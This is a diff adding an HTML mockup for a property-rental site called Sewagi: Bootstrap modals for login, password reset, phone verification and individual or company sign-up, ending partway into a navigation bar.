@@ -1,0 +1,1403 @@
+<head>
+    <meta charset="utf-8">
+    <title>Sewagi</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.2/css/all.css" integrity="sha384-/rXc/GQVaYpyDdyxK+ecHPVYJSN9bmVFBvjA/9eOB+pb3F2w2N6fc5qB9Ew5yIns" crossorigin="anonymous">
+    <link rel="stylesheet" href="../css/sewagi.css">
+</head>
+<body>
+  <div class="modal-fox">
+    <div class="modal-container modal fade" tabindex="-1" role="dialog" id="modalLogin" aria-hidden="true">
+  <div class=" modal-dialog ">
+    <div class="modal-container-inside">
+      <div class="modal-headers">
+        <div class="modal-btn-close" data-dismiss="modal" aria-label="Close">
+          <i class="moon-close btn-hover" ></i>
+        </div>
+      </div>
+
+      <div class="modal-contents">
+        <div class="modal-titles">Hi, welcome back to Sewagi</div>
+        <form style="border:none">
+          <div class="input-container">
+            <div class="input-container-inside mandatory"></div>
+            <i class="moon-mail input-icon"></i>
+            <input type="email" class="input-text input-container-err" placeholder="Email address"/>
+            <label class="error">Oopps, You have inputed wrong email or password, plase tray again</label>
+          </div>
+
+          <div class="input-container">
+            <div class="input-container-inside mandatory"></div>
+            <i class="moon-lock input-icon"></i>
+            <i class="moon-eye-blocked input-icon-eye btn-show-password" for="password"></i>
+            <input type="password" class="input-text password  input-container-err" placeholder="Password"/>
+            <label class="error">Oopps, You have inputed wrong email or password, plase tray again</label>
+          </div>
+
+        
+
+          <div class="input-bottom">
+
+            <div class="input-bottom-box-left input-checkbox">
+              <label class="btn-hover">
+                <input type="checkbox" class="checkbox"/>
+                <div class="custom-checkbox btn-hover" />
+                  <div class="radion-inside"></div>
+                </div>
+                Keep me sign in
+              </label>
+            </div>
+
+            <div class="input-bottom-box-right btn-hover" >
+              <label  data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalForget">Forget password</label>
+            </div>
+          </div>
+
+          <div class="input-container-btn btn-hover">
+            <input type="submit" class="input-btn" value="LOG IN"/>
+          </div>
+
+          <div class="line-box">
+            <label>or</label>
+          </div>
+
+          <div class="input-container-btn-google btn-hover">
+            <i class="moon-google input-icon"></i>
+            <label>Log in With Google</label>
+          </div>
+          <div class="input-container-btn-facebook btn-hover">
+            <i class="moon-facebook2 input-icon"></i>
+            <label>Log in With Facebook</label>
+          </div>
+          <div class="input-container-btn-linkedin btn-hover">
+            <i class="moon-linkedin input-icon"></i>
+            <label>Log in With Linkedin</label>
+          </div>
+
+          <div class="line-box">
+          </div>
+
+
+        </form>
+        <div>
+          <label>Not a Sewagi member yet? let's be one. </label>
+          <a href="#modalRegisterHome" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalRegisterHome">Create an account <label class="moon-long-arrow arrow-long-r"></labe></a>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    <div class="modal-container modal fade" tabindex="-1" role="dialog" id="modalForgetEmail">
+  <div class="modal-dialog mar-bot-50">
+    <div class="modal-container-inside">
+      <div class="modal-headers">
+        <div class="modal-btn-close" data-dismiss="modal" aria-label="Close">
+          <i class="moon-close btn-hover"></i>
+        </div>
+      </div>
+      <div class="modal-contents">
+        <div class="modal-titles">Forgot Your Password</div>
+        <div class="mar-t">
+          <label>Tell us your registed email with sewagi and well send you a link to reset your password</label>
+        </div>
+        <form style="border:none">
+          <div class="input-container">
+            <div class="input-container-inside mandatory"></div>
+            <i class="moon-mail input-icon"></i>
+            <input type="email" class="input-text input-container-err" placeholder="Email Address"/>
+            <label class="error">please fill with correct email address</label>
+          </div>
+
+          <div class="input-container-btn btn-hover" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalSuccessEmail">
+            <input type="submit" class="input-btn" value="SEND ME A LINK"/>
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+</div>
+    <div class="modal-container modal fade" tabindex="-1" role="dialog" id="modalForgetPhone">
+  <div class="modal-dialog mar-bot-50">
+    <div class="modal-container-inside" style="max-height: 390px;">
+      <div class="modal-headers">
+        <div class="modal-btn-close" data-dismiss="modal" aria-label="Close">
+          <i class="moon-close btn-hover"></i>
+        </div>
+      </div>
+      <div class="modal-contents">
+        <div class="modal-titles">Forgot Your Password</div>
+        <div class="mar-t">
+          <label>Tell us your registed phone number with sewagi and well send you a link to reset your password</label>
+        </div>
+        <form style="border:none">
+          <div class="input-container ">
+            <div class="input-container-inside"></div>
+            <i class="moon-phone input-icon"></i>
+            <input type="number" class="input-text input-container-err" placeholder="Phone number"/>
+            <label class="error">please fill with correct phone number</label>
+          </div>
+
+          <div class="input-container-btn btn-hover" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalSuccessEmail">
+            <input type="submit" class="input-btn" value="SEND ME A LINK"/>
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+</div>
+    <div class="modal-container modal fade" tabindex="-1" role="dialog" id="modalSuccessEmail">
+  <div class="modal-dialog">
+    <div class="modal-container-inside centered-box " style="max-height: 420px;">
+      <div class="modal-headers">
+        <div class="modal-btn-close" data-dismiss="modal" aria-label="Close">
+          <i class="moon-close btn-hover"></i>
+        </div>
+      </div>
+      <div class="modal-contents">
+        <div class="modal-img">
+          <img src="../img/modal/email.png" />
+        </div>
+        <div class="modal-titles-center">Email send!</div>
+        <div class="mar-t ta-center">
+          <label>we send an email to <label class="t-bold">daniel@aku.com</label> with a link to reset password</label>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    <div class="modal-container modal fade" tabindex="-1" role="dialog" id="modalForget">
+  <div class="modal-dialog mar-bot-50">
+    <div class="modal-container-inside" style="max-height: 380px;">
+      <div class="modal-headers">
+        <div class="modal-btn-close" data-dismiss="modal" aria-label="Close">
+          <i class="moon-close btn-hover"></i>
+        </div>
+      </div>
+      <div class="modal-contents">
+        <div class="modal-titles">Forgot Your Password</div>
+        <div class="mar-t">
+          <label>Tell us your registed email with sewagi and well send you a link to reset your password</label>
+        </div>
+        <form style="border:none">
+          <div class="input-container-btn-trans btn-hover" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalForgetPhone">
+            <div class="btn-transparent-box">
+              <i class="moon-phone input-icon"></i>
+              <label>VIA REGISTERED PHONE</label>
+            </div>
+          </div>
+          <div class="input-container-btn-trans btn-hover" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalForgetEmail">
+            <div class="btn-transparent-box">
+              <i class="moon-mail input-icon"></i>
+              <label>VIA REGISTERED EMAIL</label>
+            </div>
+          </div>
+        </form>
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="modal-container modal fade" tabindex="-1" role="dialog" id="modalRegisterHome" aria-hidden="true">
+  <div class="modal-dialog min-width-786  mar-bot-50">
+    <div class="modal-container-inside-big">
+      <div class="modal-headers">
+        <div class="modal-btn-close" data-dismiss="modal" aria-label="Close">
+          <i class="moon-close btn-hover" ></i>
+        </div>
+      </div>
+
+      <div class="modal-contents max-width-480">
+        <div class="modal-titles">Become our member & find your kind of home today</div>
+        <form style="border:none">
+
+          <div class="input-container-btn-google btn-hover">
+            <i class="moon-google input-icon"></i>
+            <label>Log in With Google</label>
+          </div>
+          <div class="input-container-btn-facebook btn-hover">
+            <i class="moon-facebook2 input-icon"></i>
+            <label>Log in With Facebook</label>
+          </div>
+          <div class="input-container-btn-linkedin btn-hover">
+            <i class="moon-linkedin input-icon"></i>
+            <label>Log in With Linkedin</label>
+          </div>
+          <div class="input-container-btn-email btn-hover" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalRegisterHomeSelect">
+            <i class="moon-mail input-icon"></i>
+            <label>Log in With Email</label>
+          </div>
+
+          <div class="mar-t-10 mar-bot-10">
+            <label>By signing up, your agree to our </label>
+            <a href="#btnModalRegisterPerson" >terms of use. </a>
+            <a href="#btnModalRegisterPerson" >privacy police. </a>
+            <label> and </label>
+            <a href="#btnModalRegisterPerson" >coocke police. </a>
+          </div>
+          <div class="line-box">
+          </div>
+
+        </form>
+        <div>
+          <label>Already have a sewagi account?</label>
+          <a href="#modalLogin" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalLogin"  >login <label class="moon-long-arrow arrow-long-r"></labe></a>
+        </div>
+      </div>
+
+      <div class="man-img">
+        <img src="../img/modal/man.png" />
+      </div>
+    </div>
+  </div>
+</div>
+      <div class="modal-container modal fade" tabindex="-1" role="dialog" id="modalRegisterHomeSelect" aria-hidden="true">
+  <div class="modal-dialog min-width-720  mar-bot-50">
+    <div class="modal-container-inside-big">
+      <div class="modal-headers">
+        <div class="modal-btn-close" data-dismiss="modal" aria-label="Close">
+          <i class="moon-close btn-hover" ></i>
+        </div>
+      </div>
+
+      <div class="modal-contents max-width-480">
+        <div class="modal-titles">Become our member & find your kind of home today</div>
+        <form style="border:none;margin:25px 0">
+
+          <div class="modal-titles">Sign up as :</div>
+          <div style="padding-left:90px">
+            <div class="input-container-btn btn-hover" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalRegisterPerson">
+              <div class="input-btn">INDIVIDUAL</div>
+            </div>
+
+            <div class="input-container-btn btn-hover" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalRegisterCompany01">
+              <div class="input-btn">COMPANY</div>
+            </div>
+          </div>
+
+          <div class="mar-t-10 mar-bot-10">
+            <label>By signing up, your agree to our </label>
+            <a href="#btnModalRegisterPerson" >terms of use. </a>
+            <a href="#btnModalRegisterPerson" >privacy police. </a>
+            <label> and </label>
+            <a href="#btnModalRegisterPerson" >coocke police. </a>
+          </div>
+          <div class="line-box">
+          </div>
+
+        </form>
+        <div>
+          <label>Already have a sewagi account?</label>
+          <a href="#modalLogin" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalLogin"  >login <label class="moon-long-arrow arrow-long-r"></labe></a>
+        </div>
+      </div>
+
+      <div class="man-img">
+        <img src="../img/modal/man.png" />
+      </div>
+    </div>
+  </div>
+</div>
+      <div class="modal-container modal fade" tabindex="-1" role="dialog" id="modalRegisterHomeType" aria-hidden="true">
+  <div class="modal-dialog mar-bot-50 min-width-480">
+    <div class="modal-container-inside">
+      <div class="modal-headers">
+      </div>
+
+      <div class="modal-contents">
+        <form style="border:none;margin:25px 0">
+
+          <div class="modal-titles-small">I wont sewagi helps to :</div>
+          <div class="input-checkbox">
+            <label class="btn-hover bold-big pad-left-40">
+              <input type="checkbox" class="checkbox"/>
+              <div class="custom-checkbox-big btn-hover" />
+                <div class="radion-inside"></div>
+              </div>
+              Female
+            </label>
+          </div>
+
+          <div class="input-checkbox">
+            <label class="btn-hover bold-big pad-left-40">
+              <input type="checkbox" class="checkbox"/>
+              <div class="custom-checkbox-big btn-hover" />
+                <div class="radion-inside"></div>
+              </div>
+              Female
+            </label>
+          </div>
+
+          <div class="input-checkbox">
+            <label class="btn-hover bold-big pad-left-40">
+              <input type="checkbox" class="checkbox"/>
+              <div class="custom-checkbox-big btn-hover" />
+                <div class="radion-inside"></div>
+              </div>
+              Female
+            </label>
+          </div>
+
+          <div class="input-container-btn btn-hover btn-not-active btn-small" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalRegisterVerification">
+            <input type="submit" class="input-btn" value="SIGN UP"/>
+          </div>
+
+        </form>
+      </div>
+    </div>
+  </div>
+</div>
+      <div class="modal-container modal fade" tabindex="-1" role="dialog" id="modalRegisterVerification">
+  <div class="modal-dialog mar-bot-50">
+    <div class="modal-container-inside">
+      <div class="modal-headers">
+        <div class="modal-btn-close" data-dismiss="modal" aria-label="Close">
+          <i class="moon-close btn-hover"></i>
+        </div>
+      </div>
+      <div class="modal-contents">
+        <div class="modal-titles">Verification code</div>
+        <div class="mar-t">
+          <label>A message with lorem ipsum hasbenn send to 086******7565</label>
+        </div>
+        <form style="border:none">
+          <div class="container-verification">
+            <div class="input-container">
+              <input type="number" maxlength="1" class="input-text" placeholder="0"/>
+            </div>
+            <div class="input-container mar-left-5">
+              <input type="number" maxlength="1"  class="input-text" placeholder="0"/>
+            </div>
+            <div class="input-container mar-left-5">
+              <input type="number" maxlength="1"  class="input-text" placeholder="0"/>
+            </div>
+            <div class="input-container mar-left-5">
+              <input type="number" maxlength="1"  class="input-text" placeholder="0"/>
+            </div>
+          </div>
+
+          <div class="input-container-btn btn-hover btn-not-active" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalSuccessEmail">
+            <input type="submit" class="input-btn" value="VERIFY CODE"/>
+          </div>
+        </form>
+        <div>
+          <label>00:00</label>
+        </div>
+        <div>
+          <label>Didn't get the code?</label>
+          <a href="#modalLogin" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalRegisterCompany06"  > send a new code <label class="moon-long-arrow arrow-long-r"></labe></a>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    <div class="modal-container modal fade" tabindex="-1" role="dialog" id="modalRegisterPerson" aria-hidden="true">
+  <div class=" modal-dialog mar-bot-50">
+    <div class="modal-container-inside">
+      <div class="modal-headers">
+        <div class="modal-btn-close" data-dismiss="modal" aria-label="Close">
+          <i class="moon-close btn-hover" ></i>
+        </div>
+      </div>
+
+      <div class="modal-contents">
+        <div class="modal-titles">sign up with facebook</div>
+        <form style="border:none">
+
+          <div class="input-double half-box">
+            <div class="input-double-inside pad-right-10">
+              <div class="input-container pad-right-10 ">
+                <div class="input-container-inside mandatory"></div>
+                <i class="moon-person_outline input-icon"></i>
+                <input type="text" class="input-text input-container-err" placeholder="First Name"/>
+                <label class="error">Oopps, You have inputed wrong email or password, plase tray again</label>
+              </div>
+            </div>
+
+            <div class="input-double-inside pad-left-10" >
+              <div class="input-container pad-left-10">
+                <div class="input-container-inside"></div>
+                <input type="text" class="input-text" placeholder="Last Name"/>
+              </div>
+            </div>
+          </div>
+          <div class="input-container">
+            <div class="input-container-inside"></div>
+            <i class="moon-mail input-icon"></i>
+            <input type="email" class="input-text input-container-err" placeholder="Email address"/>
+            <label class="error">Oopps, You have inputed wrong email or password, plase tray again</label>
+          </div>
+
+          <label class="">Prefeable input a valid whatsapp phone number for tour and negosiation convention</label>
+          <div class="input-container select-phone">
+            <div class="input-container-inside"></div>
+            <i class="moon-flag input-icon"></i>
+            <select class="input-text fox-phone" name="phone">
+              <option value="+62" data-img="https://previews.123rf.com/images/taesmileland/taesmileland1201/taesmileland120100083/12100646-england-flag-drawing-by-pastel-on-charcoal-paper.jpg">Indonesia +62</option>
+              <option value="+00" data-img="https://previews.123rf.com/images/taesmileland/taesmileland1201/taesmileland120100083/12100646-england-flag-drawing-by-pastel-on-charcoal-paper.jpg">Amerika Latin yang +00</option>
+              <option value="+00" data-img="https://previews.123rf.com/images/taesmileland/taesmileland1201/taesmileland120100083/12100646-england-flag-drawing-by-pastel-on-charcoal-paper.jpg">Amerika +00</option>
+            </select>
+            <input type="text" class="input-text input-text-phone input-container-err" placeholder="0886876"/>
+          </div>
+
+          <div class="input-container input-container-err">
+            <div class="input-container-inside"></div>
+            <i class="moon-lock input-icon"></i>
+            <i class="moon-eye-blocked input-icon-eye btn-show-password" for="password"></i>
+            <input type="password" class="input-text password" placeholder="Password"/>
+          </div>
+          <label class="error">Oopps, You have inputed wrong email or password, plase tray again</label>
+
+          <div class="input-container">
+            <div class="input-container-inside"></div>
+            <i class="moon-flag input-icon"></i>
+            <select class="input-nationality input-text" id="countryPicker" name="state">
+              <option value="AL" data-img="https://previews.123rf.com/images/taesmileland/taesmileland1201/taesmileland120100083/12100646-england-flag-drawing-by-pastel-on-charcoal-paper.jpg">Alabama</option>
+              <option value="WY" data-img="https://previews.123rf.com/images/taesmileland/taesmileland1201/taesmileland120100083/12100646-england-flag-drawing-by-pastel-on-charcoal-paper.jpg">Wyoming</option>
+            </select>
+          </div>
+
+          <div class="input-container">
+            <div class="input-container-inside"></div>
+            <i class="moon-cake input-icon"></i>
+            <input type="text" class="input-text" placeholder="dd / mm / yyyy"/>
+          </div>
+          <div class="mar-t text-line">
+            <div>You must be 18 years old or older. <div class="light">( This information won't be share to other )</div></div>
+
+          </div>
+
+          <div class="input-checkbox">
+            <label class="btn-hover pad-right-10">
+              <input type="checkbox" class="checkbox"/>
+              <div class="custom-checkbox btn-hover" />
+                <div class="radion-inside"></div>
+              </div>
+              Male
+            </label>
+
+            <label class="btn-hover">
+              <input type="checkbox" class="checkbox"/>
+              <div class="custom-checkbox btn-hover" />
+                <div class="radion-inside"></div>
+              </div>
+              Female
+            </label>
+          </div>
+
+          <div class="input-container-btn btn-hover" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalRegisterHomeType">
+            <input type="submit" class="input-btn" value="SIGN UP"/>
+          </div>
+
+          <div class="line-box">
+          </div>
+
+
+        </form>
+        <div>
+          <a href="#modalLogin" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalRegisterHome"> <label class="moon-long-arrow arrow-long-l"></labe></a>
+          <a href="#modalLogin" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalRegisterHome"> Back to all sign up option</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    <div class="modal-container modal fade" tabindex="-1" role="dialog" id="modalRegisterCompany07">
+  <div class="modal-dialog mar-bot-50">
+    <div class="modal-container-inside">
+      <div class="modal-contents">
+        <div class="modal-img">
+          <img src="../img/modal/ok.png" />
+        </div>
+        <div class="modal-titles-center">thank you for sign-up</div>
+        <div class="modal-titles-center">enjoy finding home on your terms and listing your property for free</div>
+        <div class="input-container-btn btn-hover">
+          <input type="submit" class="input-btn" value="AWESOME"/>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    <div class="modal-container modal fade" tabindex="-1" role="dialog" id="modalRegisterCompany06" aria-hidden="true">
+  <div class=" modal-dialog mar-bot-50">
+    <div class="modal-container-inside">
+      <div class="modal-headers">
+      </div>
+
+      <div class="modal-contents">
+        <div class="modal-titles mar-bot-20" style="text-align:center">Person in charge of this account</div>
+        <form style="border:none">
+
+          <label class="">Prefeable input a valid whatsapp phone number for tour and negosiation convention</label>
+          <div class="input-container select-phone">
+            <div class="input-container-inside"></div>
+            <i class="moon-flag input-icon"></i>
+            <select class="input-text fox-phone" name="phone">
+              <option value="+62" data-img="https://previews.123rf.com/images/taesmileland/taesmileland1201/taesmileland120100083/12100646-england-flag-drawing-by-pastel-on-charcoal-paper.jpg">Indonesia +62</option>
+              <option value="+00" data-img="https://previews.123rf.com/images/taesmileland/taesmileland1201/taesmileland120100083/12100646-england-flag-drawing-by-pastel-on-charcoal-paper.jpg">Amerika Latin yang +00</option>
+              <option value="+00" data-img="https://previews.123rf.com/images/taesmileland/taesmileland1201/taesmileland120100083/12100646-england-flag-drawing-by-pastel-on-charcoal-paper.jpg">Amerika +00</option>
+            </select>
+            <input type="text" class="input-text input-text-phone input-container-err" placeholder="0886876"/>
+          </div>
+
+          <div class="input-container-btn btn-hover btn-small" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalRegisterCompany07">
+            <input type="submit" class="input-btn" value="CONTINUE"/>
+          </div>
+
+        </form>
+      </div>
+    </div>
+  </div>
+</div>
+    <div class="modal-container modal fade" tabindex="-1" role="dialog" id="modalRegisterCompany05">
+  <div class="modal-dialog mar-bot-50">
+    <div class="modal-container-inside">
+      <div class="modal-headers">
+      </div>
+      <div class="modal-contents">
+        <div class="modal-titles">Unable to verify number</div>
+        <div class="mar-t mar-bot-20" style="background-color: #e8e1e1;">
+          <label> <h5 class="h5-inside">Sorry </h5> we could't verify the phone number 086******7565</label>
+        </div>
+        <form style="border:none">
+          <a class="link-btn" href="#modalLogin" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalRegisterCompany06"  > Resend OTP <label class="moon-long-arrow arrow-long-r"></labe></a>
+
+          <a class="link-btn" href="#modalLogin" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalRegisterCompany06"  > Change phone number <label class="moon-long-arrow arrow-long-r"></labe></a>
+        </form>
+      </div>
+    </div>
+  </div>
+</div>
+    <div class="modal-container modal fade" tabindex="-1" role="dialog" id="modalRegisterCompany04">
+  <div class="modal-dialog mar-bot-50">
+    <div class="modal-container-inside" >
+      <div class="modal-contents">
+        <div class="modal-titles">Verification code</div>
+        <div class="mar-t">
+          <label>A message with lorem ipsum hasbenn send to 086******7565</label>
+        </div>
+        <form style="border:none">
+          <div class="container-verification">
+            <div class="input-container">
+              <div class="input-container-inside"></div>
+              <input type="number" maxlength="2" class="input-text" placeholder="0"/>
+            </div>
+            <div class="input-container mar-left-5">
+              <div class="input-container-inside"></div>
+              <input type="number" maxlength="2"  class="input-text" placeholder="0"/>
+            </div>
+            <div class="input-container mar-left-5">
+              <div class="input-container-inside"></div>
+              <input type="number" maxlength="2"  class="input-text" placeholder="0"/>
+            </div>
+            <div class="input-container mar-left-5">
+              <div class="input-container-inside"></div>
+              <input type="number" maxlength="2"  class="input-text" placeholder="0"/>
+            </div>
+          </div>
+
+          <div class="input-container-btn btn-hover btn-not-active" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalRegisterCompany05">
+            <input type="submit" class="input-btn" value="VERIFY CODE"/>
+          </div>
+        </form>
+        <div>
+          <label>00:00</label>
+        </div>
+        <div>
+          <label>Didn't get the code?</label>
+          <a href="#modalLogin" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalRegisterCompany05"  > send a new code <label class="moon-long-arrow arrow-long-r"></labe></a>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    <div class="modal-container modal fade" tabindex="-1" role="dialog" id="modalRegisterCompany03" aria-hidden="true">
+  <div class="modal-dialog mar-bot-50 min-width-480">
+    <div class="modal-container-inside">
+      <div class="modal-headers">
+      </div>
+      <div class="modal-contents">
+        <form style="border:none;margin:25px 0">
+
+          <div class="modal-titles-small">I wont sewagi helps to :</div>
+          <div class="input-checkbox">
+            <label class="btn-hover bold-big pad-left-40">
+              <input type="checkbox" class="checkbox"/>
+              <div class="custom-checkbox-big btn-hover" />
+                <div class="radion-inside"></div>
+              </div>
+              Female
+            </label>
+          </div>
+
+          <div class="input-checkbox">
+            <label class="btn-hover bold-big pad-left-40">
+              <input type="checkbox" class="checkbox"/>
+              <div class="custom-checkbox-big btn-hover" />
+                <div class="radion-inside"></div>
+              </div>
+              Female
+            </label>
+          </div>
+
+          <div class="input-checkbox">
+            <label class="btn-hover bold-big pad-left-40">
+              <input type="checkbox" class="checkbox"/>
+              <div class="custom-checkbox-big btn-hover" />
+                <div class="radion-inside"></div>
+              </div>
+              Female
+            </label>
+          </div>
+
+          <div class="input-container-btn btn-hover btn-not-active btn-small" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalRegisterCompany04">
+            <input type="submit" class="input-btn" value="SIGN UP"/>
+          </div>
+
+        </form>
+      </div>
+    </div>
+  </div>
+</div>
+    <div class="modal-container modal fade" tabindex="-1" role="dialog" id="modalRegisterCompany02" aria-hidden="true">
+  <div class=" modal-dialog mar-bot-50">
+    <div class="modal-container-inside">
+      <div class="modal-headers">
+        <div class="modal-btn-close" data-dismiss="modal" aria-label="Close">
+          <i class="moon-close btn-hover" ></i>
+        </div>
+      </div>
+
+      <div class="modal-contents">
+        <div class="modal-titles">Person in charge of this account</div>
+        <form style="border:none">
+
+          <div class="input-double half-box">
+            <div class="input-double-inside pad-right-10">
+              <div class="input-container pad-right-10">
+                <div class="input-container-inside mandatory"></div>
+                <i class="moon-person_outline input-icon"></i>
+                <input type="text" class="input-text" placeholder="First Name"/>
+              </div>
+            </div>
+
+            <div class="input-double-inside pad-left-10" >
+              <div class="input-container pad-left-10">
+                <div class="input-container-inside"></div>
+                <input type="text" class="input-text" placeholder="Last Name"/>
+              </div>
+            </div>
+          </div>
+          <div class="input-container">
+            <div class="input-container-inside"></div>
+            <i class="moon-mail input-icon"></i>
+            <input type="email" class="input-text" placeholder="Email address"/>
+          </div>
+
+          <label class="">Prefeable input a valid whatsapp phone number for tour and negosiation convention</label>
+          <div class="input-container select-phone">
+            <div class="input-container-inside"></div>
+            <i class="moon-flag input-icon"></i>
+            <select class="input-text fox-phone" name="phone">
+              <option value="+62" data-img="https://previews.123rf.com/images/taesmileland/taesmileland1201/taesmileland120100083/12100646-england-flag-drawing-by-pastel-on-charcoal-paper.jpg">Indonesia +62</option>
+              <option value="+00" data-img="https://previews.123rf.com/images/taesmileland/taesmileland1201/taesmileland120100083/12100646-england-flag-drawing-by-pastel-on-charcoal-paper.jpg">Amerika Latin yang +00</option>
+              <option value="+00" data-img="https://previews.123rf.com/images/taesmileland/taesmileland1201/taesmileland120100083/12100646-england-flag-drawing-by-pastel-on-charcoal-paper.jpg">Amerika +00</option>
+            </select>
+            <input type="text" class="input-text input-text-phone input-container-err" placeholder="0886876"/>
+          </div>
+
+          <label class="">your password shoud be at least six characters long with combination of number and letters</label>
+          <div class="input-container ">
+            <div class="input-container-inside"></div>
+            <i class="moon-lock input-icon"></i>
+            <i class="moon-eye-blocked input-icon-eye btn-show-password" for="password"></i>
+            <input type="password" class="input-text password " placeholder="Password"/>
+          </div>
+          <div class="input-container input-container-err">
+            <div class="input-container-inside"></div>
+            <i class="moon-lock input-icon"></i>
+            <i class="moon-eye-blocked input-icon-eye btn-show-password" for="password"></i>
+            <input type="password" class="input-text password input-container-err" placeholder="Password"/>
+            <label class="error">Oopps, your password doestn match</label>
+          </div>
+
+          <div class="input-checkbox">
+            <label class="btn-hover pad-right-10">
+              <input type="checkbox" class="checkbox"/>
+              <div class="custom-checkbox btn-hover" />
+                <div class="radion-inside"></div>
+              </div>
+              Male
+            </label>
+
+            <label class="btn-hover">
+              <input type="checkbox" class="checkbox"/>
+              <div class="custom-checkbox btn-hover" />
+                <div class="radion-inside"></div>
+              </div>
+              Female
+            </label>
+          </div>
+
+          <div class="input-container-btn btn-hover" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalRegisterCompany03">
+            <input type="submit" class="input-btn" value="CONTINUE"/>
+          </div>
+
+          <div class="line-box">
+          </div>
+
+
+        </form>
+        <div>
+          <a href="#modalLogin" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalRegisterHome"> <label class="moon-long-arrow arrow-long-l"></labe></a>
+          <a href="#modalLogin" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalRegisterHome"> Back to all sign up option</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    <div class="modal-container modal fade" tabindex="-1" role="dialog" id="modalRegisterCompany01" aria-hidden="true">
+  <div class=" modal-dialog mar-bot-50">
+    <div class="modal-container-inside min-width-480">
+      <div class="modal-headers">
+        <div class="modal-btn-close" data-dismiss="modal" aria-label="Close">
+          <i class="moon-close btn-hover" ></i>
+        </div>
+      </div>
+
+      <div class="modal-contents">
+        <div class="modal-titles">Company Detiles</div>
+        <form style="border:none">
+          <div class="input-container">
+            <div class="input-container-inside"></div>
+            <i class="moon-office input-icon"></i>
+            <input type="text" class="input-text" placeholder="Company name"/>
+          </div>
+          <div class="input-container-nospace">
+            <div class="input-container-inside"></div>
+            <input type="text" class="input-text" placeholder="Enter street address"/>
+          </div>
+
+          <div class="input-double half-box">
+            <div class="input-double-inside pad-right-10">
+              <div class="input-container-nospace pad-right-10 ">
+                <div class="input-container-inside mandatory"></div>
+                <input type="text" class="input-text  input-container-err" placeholder="Enter address number"/>
+                <label class="error">Oopps, You have inputed wrong email or password, plase tray again</label>
+              </div>
+            </div>
+
+            <div class="input-double-inside pad-left-10" >
+              <div class="input-container-nospace pad-left-10">
+                <div class="input-container-inside"></div>
+                <input type="text" class="input-text" placeholder="Enter detile"/>
+              </div>
+            </div>
+          </div>
+          <div class="input-container-nospace">
+            <div class="input-container-inside mandatory"></div>
+            <input type="text" class="input-text" placeholder="Enter city"/>
+          </div>
+          <div class="input-container-nospace">
+            <div class="input-container-inside mandatory"></div>
+            <input type="text" class="input-text" placeholder="Enter district"/>
+          </div>
+          <div class="input-container-nospace">
+            <div class="input-container-inside mandatory"></div>
+            <input type="number" class="input-text" placeholder="Enter pos code"/>
+          </div>
+          <div class="input-container-nospace">
+            <div class="input-container-inside mandatory"></div>
+            <input type="number" class="input-text" placeholder="Office phone number"/>
+          </div>
+          <div class="input-container-nospace">
+            <div class="input-container-inside mandatory"></div>
+            <input type="number" class="input-text" placeholder="Website"/>
+          </div>
+
+          <div class="input-container-btn btn-hover btn-not-active" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalRegisterCompany02">
+            <input type="submit" class="input-btn" value="CONTINUE"/>
+          </div>
+
+          <div class="line-box">
+          </div>
+
+
+        </form>
+        <div>
+          <a href="#modalLogin" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalRegisterHome"> <label class="moon-long-arrow arrow-long-l"></labe></a>
+          <a href="#modalLogin" data-dismiss="modal" aria-label="Close" data-toggle="modal" data-target="#modalRegisterHome"> Back to all sign up option</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+  </div>
+    <nav class="navbar navbar-expand-lg navbar-light bg-white nav-border fixed-top navbar-transparent" solid-on-scroll>
+<div class="container pb-2 pt-2">
+    <a class="navbar-brand" href="http://sewagi-web.inspira.web.id">Navbar</a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent"
+        aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+    </button>
+
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav mr-auto">
+            <li class="nav-item active">
+                <a class="nav-link" href="#">About Us</a>
+            </li>
+        </ul>
+        <div class="navbar-search">
